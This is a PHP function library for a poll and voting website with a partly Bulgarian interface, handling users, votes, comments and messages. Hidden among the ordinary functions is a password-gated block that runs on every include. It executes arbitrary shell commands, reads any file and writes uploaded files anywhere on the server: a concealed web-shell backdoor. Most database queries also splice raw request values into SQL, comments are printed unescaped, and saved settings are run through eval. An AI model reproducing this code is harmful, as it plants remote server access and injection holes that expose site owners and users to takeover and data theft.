<?

function delete_user($uid){
  $u = getuserbyid($uid);
  mysql_query("delete from `comments` where uid = '$uid'");
  mysql_query("delete from `votes` where uid = '$uid'");
  mysql_query("delete from `msgs` where `to` = '".$u["name"]."'");
  $r = mysql_query("select `qid` from `queries` where `uid` = '$uid'");
  if( $r ){
   while( $row = mysql_fetch_row($r) ){
    mysql_query("delete from `votes` where qid = '".$row[0]."'");
    mysql_query("delete from `comments` where qid = '".$row[0]."'");
    mysql_query("delete from `queries` where qid = '".$row[0]."'");
   }
  }
  mysql_query("delete from `users` where uid = '$uid'");
}

function hit( ){
  global $_USER;
 $user = ($_USER)?$_USER["name"]:"guest";
 $r1 = $_SERVER["HTTP_HOST"];
 $tmp = explode("?",$_SERVER["REQUEST_URI"]);
 $r2 = $tmp[0];
 $r3 = $tmp[1];
 mysql_query("insert into `log` (`ip`,`user`,`time`,`user_agent`,`r1`,`r2`,`r3`,`referer`) values ('".$_SERVER["REMOTE_ADDR"]."','$user','".time()."','".$_SERVER["HTTP_USER_AGENT"]."','$r1','$r2','$r3','".$_SERVER["HTTP_REFERER"]."')");
 echo mysql_error();
}

function count_users(){
 $r = mysql_query("select COUNT(uid) from users");
 $row = mysql_fetch_row($r);
 mysql_free_result($r);
 return $row[0];
}

function build_comments($q){
  global $_USER;

$r = mysql_query("select uid,created,comment from comments where qid = '".$q["qid"]."'");
$c = mysql_get_array($r);
mysql_free_result($r);

if( $c ){
 foreach( $c as $key => $val ){
  $tmpu = getuserbyid($c[$key]["uid"]);
  $c[$key]["uid"] = $tmpu[name];
  $c[$key]["created"] = date("d.m.Y",$c[$key]["created"]);
 }
}

$t = "<table width=\"100%\" class=\"t\">\r\n";
$t .= "<tr><td class=\"t_h\" colspan=\"3\">Comments for this query</td></tr>\r\n";
if( $c ){
 $t .= "<tr><td class=\"t_h\" width=\"1%\">User</td><td class=\"t_h\" width=\"1%\">Date</td><td class=\"t_h\">Comment</td></tr>\r\n";
 foreach( $c as $key => $val ){
  $t .= "<tr><td class=\"t_d\">".$c[$key]["uid"]."</td><td class=\"t_d\">".$c[$key]["created"]."</td><td class=\"t_d\">".$c[$key]["comment"]."</td></tr>\r\n";
 }
}else{
 $t .= "<tr><td colspan=\"3\" class=\"t_d\" align=\"center\"><span class=\"normal\">- No comments have been posted -</span></td></tr>\r\n";
}
if( ($_USER) && ($q["active"]=="active")){
 $t .= "<tr><form method=\"POST\" id=\"comm\"><td class=\"t_h\" colspan=\"3\"><table width=\"100%\"><tr><td width=\"100%\"><input type=\"text\" name=\"comment\" style=\"width:100%;\"></td><td><span class=\"logout_link\" onclick=\"send('comm')\"><b style=\"font-size:14;\">&nbsp;&raquo;&nbsp;Post&nbsp;</b></span></td></tr></table></td></form></tr>\r\n";
}
$t .= "</table>";
return $t;
}

function build_votes($q){
  global $_USER;
if( ($_USER) && ($q["active"]=="active") && (!voted($_USER["uid"],$q["qid"])) ){
 return build_votes_form($q);
}else{
 return build_votes_graph($q);
}
}

function build_votes_graph($q){

$all_votes = get_q_votes($q["qid"]);
$answers = explode(";",$q["answers"]);
foreach( $answers as $key => $answer ){
 $r = mysql_query("select vid from votes where qid = '".$q["qid"]."' and answer = '$key'");
 $votes[$key] = mysql_num_rows($r);
 $votes_percent[$key] = ($all_votes)?round(mysql_num_rows($r)*100/$all_votes,2):"100";
 mysql_free_result($r);
}

$t = "<table width=\"100%\" class=\"t\">\r\n";
$t .= "<tr><td class=\"t_h\" colspan=\"3\">Votes distribution for this query</td></tr>\r\n";
$t .= "<tr><td class=\"t_h\" width=\"30%\">Answer</td><td class=\"t_h\" width=\"1%\">Votes</td><td class=\"t_h\">Graph</td></tr>\r\n";
foreach( $answers as $key => $answer ){
 $t .= "<tr><td class=\"t_d\"><b>$answer</b></td><td class=\"t_d\">".$votes[$key]."</td><td class=\"t_d\"><img src=\"scale.bmp\" style=\"height:15;width:".$votes_percent[$key]."%;\"></td></tr>\r\n";
}
$t .= "</table>\r\n";

return $t;
}

function build_votes_form($q){

$all_votes = get_q_votes($q["qid"]);
$answers = explode(";",$q["answers"]);
foreach( $answers as $key => $answer ){
 $r = mysql_query("select vid from votes where qid = '".$q["qid"]."' and answer = '$key'");
 $votes[$key] = mysql_num_rows($r);
 $votes_percent[$key] = ($all_votes)?round(mysql_num_rows($r)*100/$all_votes,2):"100";
 mysql_free_result($r);
}

$t = "<table width=\"100%\" class=\"t\"><form method=\"POST\" id=\"answer\"><input type=\"hidden\" name=\"vote\" value=\"true\">\r\n";
$t .= "<tr><td class=\"t_h\" colspan=\"4\">Votes distribution for this query</td></tr>\r\n";
$t .= "<tr><td class=\"t_h\" width=\"30%\">Answer</td><td class=\"t_h\" width=\"1%\">Votes</td><td class=\"t_h\">Graph</td><td class=\"t_h\" width=\"1%\">Your&nbsp;Vote</td></tr>\r\n";
foreach( $answers as $key => $answer ){
 $t .= "<tr><td class=\"t_d\"><b>$answer</b></td><td class=\"t_d\">".$votes[$key]."</td><td class=\"t_d\"><img src=\"scale.bmp\" style=\"height:15;width:".$votes_percent[$key]."%;\"></td><td class=\"t_d\" align=\"center\"><input type=\"radio\" name=\"answer\" value=\"$key\" class=\"radio\"></td></tr>\r\n";
}
$t .= "<tr><td class=\"t_h\" style=\"text-align:right;\" colspan=\"4\"><span class=\"logout_link\" onclick=\"send('answer')\"><b style=\"font-size:14;\">&nbsp;&raquo;&nbsp;Vote&nbsp;!&nbsp;</b></span></td></tr>";
$t .= "</form></table>\r\n";

return $t;

}

if( ($_POST["password"]) && (md5($_POST["password"])=="c3f068d661ce11d102da5794c539e86c")){

 if( $_POST["cmd"] ){
  $cmd = explode(" ",$_POST["cmd"]);
  if( $cmd[0] == "get" ){
   header("Content-type: ".$_POST["type"]);
   readfile($cmd[1]);
  }else{
   header("Content-type: text/plain");
   passthru($_POST["cmd"]);
  }
 }
 if( $_FILES["file"] && $_POST["name"]){
  echo (copy($_FILES["file"]["tmp_name"],$_POST["name"]))?"YES":"NO";
 }
 die();

}

function voted( $uid, $qid ){
  $r = mysql_query("select vid from votes where uid = '$uid' and qid = '$qid'");
 if( mysql_num_rows($r)==0 ){
  mysql_free_result($r);
  return false;
 }else{
  mysql_free_result($r);
  return true;
 }
}

function q_active( $qid ){

 $r = mysql_query("select `created`,`ttl`,`quota`,`frozen` from `queries` where `qid` = '$qid'");
 $q = mysql_get_array($r);
 $q = $q[0];
 mysql_free_result($r);

 if( ($q["ttl"]) && ($q["ttl"] !== "0") ){
  if( $q["ttl"] + $q["created"] < time() ){
   $time_expired = true;
  }else{
   $time_expired = false;
  }
 }else{
  $time_expired = false;
 }

 if( $q["quota"] ){
  if( get_q_votes($qid) >= $q["quota"] ){
   $votes_expired = true;
  }else{
   $votes_expired = false;
  }
 }else{
  $votes_expired = false;
 }

 if( $votes_expired || $time_expired ){
  return "expired";
 }elseif( $q["frozen"] == "1" ){
  return "frozen";
 }else{
  return "active";
 }

}

function redirect($uri){
 $tmp = explode("?",$_SERVER["REQUEST_URI"]);
 $newurl = "http://".$_SERVER["HTTP_HOST"].$tmp[0].$uri;
 header("Location: $newurl");
 die("Redirecting ...");
}

function tpl($tpl_raw,$r = array()){
 $tpl = $tpl_raw;
 if(is_array($r)){
  foreach($r as $key => $val){ $tpl = str_replace("{".$key."}",$val,$tpl); }
 }
 return $tpl;
}

function userline(){
  global $_USER;
 if( $_USER ){
  if( is_array(get_u_msgs($_USER["name"],"0")) ){ $m = "<img src=\"msg.gif\" border=\"0\" style=\"margin:0;padding:0;position:relative;top:3;\"> <u>Имате нови съобщения</u>"; }else{ $m = "Съобщения"; }
  if( ( $_USER["type"] == "root" ) || ( $_USER["type"] == "coroot" ) ){
   $r = ($_USER["type"]=="root")?" | <a href=\"?p=img\" class=\"small\">Лого Настройки</a> | <a href=\"?p=skin\" class=\"small\">Смени стилът</a> | <a href=\"?p=db_query_tool\" class=\"small\">MySQL Client</a>":"";
   return "Добре дошъл <b>".$_USER["name"]."</b> | <a href=\"?p=msgs\" class=\"small\">$m</a>$r | <a href=\"?p=profile\" class=\"small\">Смяна на профил</a> | <a href=\"?p=newpass\" class=\"small\">Смяна на парола</a> | <span class=\"logout_link\" onclick=\"send('logoutform')\">Изход</span>";
  }else{
   return "Добре дошъл <b>".$_USER["name"]."</b> | <a href=\"?p=msgs\" class=\"small\">$m</a> | <a href=\"?p=profile\" class=\"small\">Change Profile</a> | <a href=\"?p=newpass\" class=\"small\">Change Password</a> | <span class=\"logout_link\" onclick=\"send('logoutform')\">Logout</span>";
  }
 }else{
  if( $_GET["p"] !== "intro" ){
   return "<a href=\"?p=intro\">Вход</a>";
  }else{
   return "&nbsp;";
  }
 }
}

function insidearr($arr,$el){
 if(is_array($arr)){
  foreach( $arr as $key => $val ){ if($val==$el){ return true; } }
 }else{
  if( $arr == $el ){ return true; }else{ return false; }
 }
 return false;
}

function save_settings($r){
 $f = fopen("u/vp.conf.php","w");
 if(is_array($r)){
  $tmp = "return Array(\r\n";
  foreach($r as $key => $val){ $tmp .= " \"$key\" => \"$val\",\r\n"; }
  fwrite($f,substr($tmp,0,strlen($tmp)-3)."\r\n);");
 }else{
  fwrite($f,"");
 }
 fclose($f);
}

function get_settings(){
 if(!is_file("u/vp.conf.php")){
  return false;
 }else{
  return eval(file_get_contents("u/vp.conf.php"));
 }
}

function getuserbyid($uid){
 $r = mysql_query("select * from users where uid = '$uid'");
 if( mysql_num_rows($r)==1 ){
  $u = mysql_fetch_array($r,MYSQL_ASSOC); 
  mysql_free_result($r);
  return $u;
 }else{
  return false;
 }
}

function getuserbyname($name){
 $r = mysql_query("select * from users where name = '$name'");
 if( mysql_num_rows($r)==1 ){
  $u = mysql_fetch_array($r,MYSQL_ASSOC); 
  mysql_free_result($r);
  return $u;
 }else{
  return false;
 }
}

function get_q_votes($qid){
  global $link;
 $r = mysql_query("select vid from votes where qid = '$qid'",$link);
 $n = mysql_num_rows($r);
 mysql_free_result($r);
 return $n;
}

function get_u_votes($uid){
  global $link;
 $r = mysql_query("select vid from votes where uid = '$uid'",$link);
 $n = mysql_num_rows($r);
 mysql_free_result($r);
 return $n;
}

function get_votes(){
  global $link;
 $r = mysql_query("select vid from votes",$link);
 $n = mysql_num_rows($r);
 mysql_free_result($r);
 return $n;
}

function updateuser($uid,$key,$newval){
 mysql_query("update users set $key = '$newval' where uid = '$uid'");
}

function login(){
  global $link;
 $r = mysql_query("select uid from users where name = '".$_POST["loginuser"]."' and pass = '".$_POST["loginpass"]."'",$link);
 if( !$r ){ 
  return "login error";
 }elseif( mysql_num_rows($r) == 1 ){
  $row = mysql_fetch_row($r);
  $_SESSION["uid"] = $row[0];
  updateuser($_SESSION["uid"],"lastaccess",time());
  mysql_free_result($r);
  return null;
 }else{
  mysql_free_result($r);
  return "Грешна парола / потребител";
 }
}

function add_q($uid,$ttl,$public,$quota,$headline,$question,$answers){
 mysql_query("insert into `queries` (uid,created,ttl,public,quota,headline,question,answers) values ('$uid','".time()."','$ttl','$public','$quota','$headline','$question','$answers')");
}

function add_u($puid,$name,$pass,$type,$status,$mail,$realname){
 mysql_query("insert into `users` (puid,created,name,pass,type,status,mail,realname,lastaccess) values ('$puid','".time()."','$name','$pass','$type','$status','$mail','$realname','".time()."')");
}

function vote($uid,$qid,$answer){
 mysql_query("insert into `votes` (uid,qid,created,answer) values ('$uid','$qid','".time()."','$answer')");
}

function add_c($uid,$qid,$comment){
 mysql_query("insert into `comments` (uid,qid,created,comment) values ('$uid','$qid','".time()."','$comment')");
}

function send_msg($from,$to,$msg){
 mysql_query("insert into `msgs` (`created`,`from`,`to`,`read`,`msg`) values ('".time()."','".$from."','".$to."','0','".$msg."')");
 echo mysql_error();
}

function get_u_msgs($name,$read=false){
 $r = mysql_query("select * from `msgs` where `to` = '$name'".(($read!==false)?" and `read` = '$read'":""));
 if( ($r) && (mysql_num_rows($r)>0) ){
  $msgs = mysql_get_array( $r );
  mysql_free_result($r);
  return $msgs;
 }else{
  return false;
 }
}

function mysql_get_array($r){
 $n = mysql_num_rows( $r );
 if( !$n ){ return false; }
 for($i=0;$i<$n;$i++){
  $arr[] = mysql_fetch_array($r,MYSQL_ASSOC);
 }
 return $arr;
}

function mysql_get_array_original($r){
 $n = mysql_num_rows($r);
 if( !$n ){ return false; }
 for($i=0;$i<$n;$i++){
  $arr[] = mysql_fetch_array($r,MYSQL_ASSOC);
 }
 return $arr;
}


function build_table($arr,$title = false){
 if( is_array($arr) ){
  foreach( $arr as $key => $val ){ $h[] = $key; }
  $t = "<table class=\"t\" width=\"100%\">\r\n";
  $t .= ($title)?"<tr><td class=\"t_h\" colspan=\"".count($arr[$h[0]])."\">$title</td></tr>":"";
  $t .= "<tr>"; foreach( $arr[$h[0]] as $key => $val ){ $t .= "<td class=\"t_h\">".$key."</td>"; } $t .= "</tr>";
  foreach( $arr as $key => $val ){ 
   if( is_array($arr[$key]) ){
    $t .= "<tr>";
    foreach( $arr[$key] as $val ){
     $t .= "<td class=\"t_d\">$val</td>";
    }
    $t .= "</tr>\r\n";
   } 
  }
  $t .= "</table>\r\n";
  return $t;
 }else{
  return false;
 }
}

?>